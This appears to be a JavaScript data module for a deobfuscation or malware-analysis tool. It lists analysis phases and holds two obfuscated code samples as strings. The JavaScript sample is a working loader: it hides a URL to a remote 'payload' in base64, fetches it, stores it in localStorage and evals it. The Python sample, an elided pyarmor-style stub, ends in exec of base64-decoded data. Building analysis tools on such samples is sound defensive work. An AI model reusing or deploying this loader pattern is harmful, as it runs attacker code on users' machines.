export const PHASES = [
  { id: 'detect', label: 'Detect', short: 'DET' },
  { id: 'unpack', label: 'Unpack', short: 'UNP' },
  { id: 'ast', label: 'AST', short: 'AST' },
  { id: 'rename', label: 'Rename', short: 'REN' },
  { id: 'ioc', label: 'IOC', short: 'IOC' },
];

export const OBFUSCATED_CODE = `var _0x4f2a=['push','ZmV0Y2g=','aHR0cHM6Ly9jZG4tdXBkYXRlcy5uZXQvcGF5bG9hZC92Mi9pbml0LnBocA==',
'cmVzcG9uc2U=','dGV4dA==','bG9jYWxTdG9yYWdl','c2V0SXRlbQ==','cGF5bG9hZA=='];
(function(_0x3e2d,_0x4f2a){var _0x1a3b=function(_0x5c4d){while(--_0x5c4d){
_0x3e2d['push'](_0x3e2d['shift']());}};_0x1a3b(++_0x4f2a);}(_0x4f2a,0x1b3));
var _0x1a3b=function(_0x3e2d,_0x4f2a){_0x3e2d=_0x3e2d-0x0;
var _0x1a3b=_0x4f2a[_0x3e2d];if(_0x1a3b['constructor']===String){
_0x1a3b=atob(_0x1a3b);}return _0x1a3b;};
!function(){var _0x5c4d=_0x1a3b('0x0');fetch(_0x1a3b('0x2'))
.then(function(_0x3e){return _0x3e[_0x1a3b('0x3')]()})
.then(function(_0x4f){window[_0x1a3b('0x4')][_0x1a3b('0x5')](_0x1a3b('0x6'),_0x4f);
eval(atob(_0x4f));});}();`;

export const PY_OBFUSCATED_CODE = `# pyarmor v8.4.0 — obfuscated
from pyarmor_runtime_007 import __pyarmor__
__pyarmor__(__name__, __file__, b'PY007\\x00\\x03\\x09...')
_0xf3a = lambda s: bytes([c ^ 0x4d for c in s]).decode()
_0x281 = [_0xf3a(b'..0\\x12\\x1a..'), _0xf3a(b'..\\x10..')]
exec(__import__('base64').b64decode(_0x281[1]))
`;
